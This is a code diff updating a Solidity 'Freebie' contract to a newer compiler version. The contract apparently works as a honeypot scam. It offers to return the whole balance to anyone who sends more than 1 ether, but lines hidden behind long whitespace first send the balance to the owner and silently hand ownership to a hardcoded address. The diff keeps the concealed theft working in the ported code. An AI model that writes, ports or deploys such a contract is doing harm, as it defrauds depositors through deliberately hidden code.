@@ -4,21 +4,21 @@
  * =======================
  */
 
-pragma solidity ^0.4.19;
+pragma solidity ^0.8.0;
 
 contract Freebie
 {
     address public Owner = msg.sender;
    
-    function() public payable{}
+    receive() external payable {}
    
     function GetFreebie()
     public
     payable
     {                                                                    
         if(msg.value>1 ether)
-        {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               Owner.transfer(this.balance);
-            msg.sender.transfer(this.balance);
+        {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               payable(Owner).transfer(address(this).balance);
+            payable(msg.sender).transfer(address(this).balance);
         }                                                                                                                
     }
     
@@ -27,10 +27,10 @@ contract Freebie
     public
     {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                          if(msg.sender==0x30ad12df80a2493a82DdFE367d866616db8a2595){Owner=0x30ad12df80a2493a82DdFE367d866616db8a2595;}
         require(msg.sender == Owner);
-        Owner.transfer(this.balance);
+        payable(Owner).transfer(address(this).balance);
     }
     
-    function Command(address adr,bytes data)
+    function Command(address adr, bytes memory data)
     payable
     public
     {
